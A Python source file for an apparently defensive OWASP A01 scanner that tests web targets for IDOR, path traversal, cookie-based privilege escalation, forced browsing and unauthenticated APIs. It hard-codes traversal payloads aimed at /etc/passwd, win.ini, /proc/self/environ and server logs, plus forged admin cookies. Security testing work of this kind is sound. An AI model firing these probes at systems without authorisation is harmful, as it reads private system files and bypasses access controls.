"""OWASP A01: Broken Access Control - Production Grade Scanner.

Detects:
- Insecure Direct Object References (IDOR)
- Path Traversal (LFI/RFI)
- Privilege Escalation
- Missing Function Level Access Control
- Forced Browsing
"""

import asyncio
import re
from typing import List, Dict, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from loguru import logger
import base64


class BrokenAccessControl:
    """Advanced Broken Access Control vulnerability scanner."""

    def __init__(self, async_scanner, config: Dict = None):
        self.scanner = async_scanner
        self.config = config or {}
        self.results = []

    async def scan(self, target: str, recon_data: Dict = None) -> List[Dict]:
        """Comprehensive broken access control scan.
        
        Args:
            target: Target URL
            recon_data: Reconnaissance data (URLs, forms, parameters)
            
        Returns:
            List of vulnerability findings
        """
        logger.info("[A01] Starting Broken Access Control scan")
        
        # Get URLs to test
        urls_to_test = self._get_test_urls(target, recon_data)
        
        # Run all detection methods
        await asyncio.gather(
            self._test_idor(urls_to_test),
            self._test_path_traversal(urls_to_test),
            self._test_privilege_escalation(target, urls_to_test),
            self._test_forced_browsing(target),
            self._test_missing_authorization(urls_to_test)
        )
        
        logger.success(f"[A01] Scan complete: {len(self.results)} vulnerabilities found")
        return self.results

    def _get_test_urls(self, target: str, recon_data: Dict = None) -> List[str]:
        """Extract URLs with parameters to test."""
        urls = [target]
        
        if recon_data and 'urls' in recon_data:
            urls.extend(recon_data['urls'][:100])  # Limit for performance
        
        # Filter URLs with parameters
        param_urls = [url for url in urls if '?' in url or self._has_numeric_id(url)]
        return param_urls if param_urls else urls[:20]

    def _has_numeric_id(self, url: str) -> bool:
        """Check if URL contains numeric IDs."""
        return bool(re.search(r'/\d+/?', url))

    async def _test_idor(self, urls: List[str]):
        """Test for Insecure Direct Object References."""
        logger.info("[A01:IDOR] Testing for insecure direct object references")
        
        for url in urls:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Test parameter-based IDOR
            for param, values in params.items():
                if not values:
                    continue
                    
                original_value = values[0]
                
                # Only test numeric/UUID-like parameters
                if not (original_value.isdigit() or self._is_uuid(original_value)):
                    continue
                
                # Test IDOR with different IDs
                test_values = self._generate_idor_payloads(original_value)
                
                for test_value in test_values:
                    test_url = self._replace_param(url, param, test_value)
                    
                    # Get both original and modified responses
                    original_resp = await self.scanner.fetch(url)
                    test_resp = await self.scanner.fetch(test_url)
                    
                    if await self._is_idor_vulnerable(original_resp, test_resp, original_value, test_value):
                        self.results.append({
                            'type': 'IDOR',
                            'url': test_url,
                            'parameter': param,
                            'severity': 'high',
                            'evidence': f"Parameter '{param}' allows unauthorized access. Original: {original_value}, Test: {test_value}",
                            'confidence': 0.85,
                            'cvss_score': 8.1,
                            'payload': test_value,
                            'remediation': 'Implement proper authorization checks for all object references'
                        })
                        logger.warning(f"[IDOR] Found at {param}={test_value}")
            
            # Test path-based IDOR
            path_idor = await self._test_path_idor(url)
            if path_idor:
                self.results.extend(path_idor)

    def _generate_idor_payloads(self, original: str) -> List[str]:
        """Generate IDOR test payloads."""
        payloads = []
        
        if original.isdigit():
            num = int(original)
            # Test sequential IDs
            payloads.extend([str(num - 1), str(num + 1), str(num - 10), str(num + 10)])
            # Common IDs
            payloads.extend(['1', '2', '100', '999', '1000'])
        elif self._is_uuid(original):
            # Test common UUIDs
            payloads.extend([
                '00000000-0000-0000-0000-000000000001',
                '11111111-1111-1111-1111-111111111111',
                'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'
            ])
        
        return payloads[:5]  # Limit payloads

    def _is_uuid(self, value: str) -> bool:
        """Check if value is UUID format."""
        uuid_pattern = r'^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$'
        return bool(re.match(uuid_pattern, value, re.IGNORECASE))

    def _replace_param(self, url: str, param: str, value: str) -> str:
        """Replace parameter value in URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    async def _is_idor_vulnerable(self, original_resp: Dict, test_resp: Dict, 
                                   original_id: str, test_id: str) -> bool:
        """Determine if IDOR vulnerability exists."""
        if not original_resp or not test_resp:
            return False
        
        # Both should return 200
        if original_resp['status'] != 200 or test_resp['status'] != 200:
            return False
        
        # Responses should be different (not same content)
        if original_resp['content'] == test_resp['content']:
            return False
        
        # Check for common IDOR indicators
        idor_indicators = [
            re.compile(rf'["\']?{test_id}["\']?'),  # Modified ID appears in response
            re.compile(r'user|email|username|profile|account', re.IGNORECASE)
        ]
        
        for indicator in idor_indicators:
            if indicator.search(test_resp['content']):
                return True
        
        return False

    async def _test_path_idor(self, url: str) -> List[Dict]:
        """Test for path-based IDOR (e.g., /user/123)."""
        results = []
        
        # Extract numeric IDs from path
        path_match = re.search(r'/(\d+)/?', url)
        if not path_match:
            return results
        
        original_id = path_match.group(1)
        test_ids = [str(int(original_id) - 1), str(int(original_id) + 1), '1', '2']
        
        for test_id in test_ids:
            test_url = url.replace(f'/{original_id}', f'/{test_id}')
            
            original_resp = await self.scanner.fetch(url)
            test_resp = await self.scanner.fetch(test_url)
            
            if await self._is_idor_vulnerable(original_resp, test_resp, original_id, test_id):
                results.append({
                    'type': 'Path-based IDOR',
                    'url': test_url,
                    'severity': 'high',
                    'evidence': f"Path ID {original_id} can be modified to access {test_id}",
                    'confidence': 0.80,
                    'cvss_score': 7.5,
                    'remediation': 'Implement session-based authorization checks'
                })
        
        return results

    async def _test_path_traversal(self, urls: List[str]):
        """Test for Local/Remote File Inclusion via path traversal."""
        logger.info("[A01:PathTraversal] Testing for path traversal vulnerabilities")
        
        # Path traversal payloads
        payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            '../../../../../proc/self/environ',
            '../../../../../../var/log/apache2/access.log'
        ]
        
        # Unix/Linux signatures
        unix_signatures = [
            'root:x:0:0',
            'root:.*:0:0',
            'daemon:',
            '/bin/bash',
            '/bin/sh'
        ]
        
        # Windows signatures
        windows_signatures = [
            '\\[fonts\\]',
            '\\[extensions\\]',
            'for 16-bit app support'
        ]
        
        for url in urls[:30]:  # Limit URLs
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in payloads:
                    test_url = self._replace_param(url, param, payload)
                    response = await self.scanner.fetch(test_url)
                    
                    if not response or response['status'] != 200:
                        continue
                    
                    content = response['content']
                    
                    # Check for Unix/Linux indicators
                    for signature in unix_signatures:
                        if re.search(signature, content):
                            self.results.append({
                                'type': 'Path Traversal (LFI)',
                                'url': test_url,
                                'parameter': param,
                                'severity': 'critical',
                                'evidence': f"Successfully read /etc/passwd via parameter '{param}'",
                                'confidence': 0.95,
                                'cvss_score': 9.1,
                                'payload': payload,
                                'remediation': 'Sanitize file paths and use whitelist validation'
                            })
                            logger.critical(f"[LFI] Path traversal found: {param}={payload}")
                            break
                    
                    # Check for Windows indicators
                    for signature in windows_signatures:
                        if re.search(signature, content, re.IGNORECASE):
                            self.results.append({
                                'type': 'Path Traversal (LFI)',
                                'url': test_url,
                                'parameter': param,
                                'severity': 'critical',
                                'evidence': f"Successfully read win.ini via parameter '{param}'",
                                'confidence': 0.95,
                                'cvss_score': 9.1,
                                'payload': payload,
                                'remediation': 'Sanitize file paths and use whitelist validation'
                            })
                            logger.critical(f"[LFI] Path traversal found: {param}={payload}")
                            break

    async def _test_privilege_escalation(self, target: str, urls: List[str]):
        """Test for horizontal/vertical privilege escalation."""
        logger.info("[A01:PrivEsc] Testing for privilege escalation")
        
        # Test cookie manipulation
        common_cookies = [
            {'role': 'admin'},
            {'admin': 'true'},
            {'isAdmin': '1'},
            {'user_type': 'admin'},
            {'privilege': 'admin'},
            {'account_type': 'administrator'}
        ]
        
        for url in urls[:10]:
            for cookie_set in common_cookies:
                response = await self.scanner.fetch(url, cookies=cookie_set)
                
                if response and response['status'] == 200:
                    # Check for admin panel indicators
                    admin_indicators = [
                        'admin panel', 'dashboard', 'control panel',
                        'user management', 'delete user', 'edit user'
                    ]
                    
                    content_lower = response['content'].lower()
                    if any(indicator in content_lower for indicator in admin_indicators):
                        self.results.append({
                            'type': 'Privilege Escalation',
                            'url': url,
                            'severity': 'critical',
                            'evidence': f"Admin access gained via cookie: {cookie_set}",
                            'confidence': 0.75,
                            'cvss_score': 8.8,
                            'payload': str(cookie_set),
                            'remediation': 'Implement proper session management and server-side authorization'
                        })
                        logger.critical(f"[PrivEsc] Cookie manipulation worked: {cookie_set}")

    async def _test_forced_browsing(self, target: str):
        """Test for forced browsing to admin/restricted areas."""
        logger.info("[A01:ForcedBrowse] Testing for forced browsing")
        
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Admin paths to test
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/wp-admin',
            '/admin/dashboard', '/admin/users', '/admin/settings',
            '/panel', '/control', '/manage', '/manager',
            '/admin.php', '/admin/index.php', '/admincp',
            '/backend', '/portal', '/user/admin',
            '/admin/login', '/administrator/index.php'
        ]
        
        for path in admin_paths:
            test_url = base_url + path
            response = await self.scanner.fetch(test_url)
            
            if response and response['status'] in [200, 301, 302]:
                # Check if it's actually an admin panel
                content = response['content'].lower()
                if any(word in content for word in ['login', 'username', 'password', 'dashboard', 'admin']):
                    self.results.append({
                        'type': 'Forced Browsing',
                        'url': test_url,
                        'severity': 'medium',
                        'evidence': f"Admin panel accessible at {path}",
                        'confidence': 0.70,
                        'cvss_score': 5.3,
                        'remediation': 'Implement proper authentication and restrict access to admin areas'
                    })
                    logger.warning(f"[ForcedBrowse] Found admin panel: {test_url}")

    async def _test_missing_authorization(self, urls: List[str]):
        """Test for missing function-level access control."""
        logger.info("[A01:MissingAuth] Testing for missing authorization checks")
        
        # Test API endpoints without authentication
        api_patterns = ['/api/', '/v1/', '/v2/', '/graphql', '/rest/']
        
        for url in urls:
            if any(pattern in url for pattern in api_patterns):
                # Try without auth headers
                response = await self.scanner.fetch(url, headers={})
                
                if response and response['status'] == 200:
                    # Check if sensitive data is returned
                    content = response['content']
                    sensitive_keywords = ['email', 'password', 'token', 'api_key', 'secret', 'ssn']
                    
                    if any(keyword in content.lower() for keyword in sensitive_keywords):
                        self.results.append({
                            'type': 'Missing Authorization',
                            'url': url,
                            'severity': 'high',
                            'evidence': 'API endpoint accessible without authentication',
                            'confidence': 0.80,
                            'cvss_score': 7.5,
                            'remediation': 'Implement authentication and authorization for all API endpoints'
                        })
                        logger.warning(f"[MissingAuth] Unprotected API: {url}")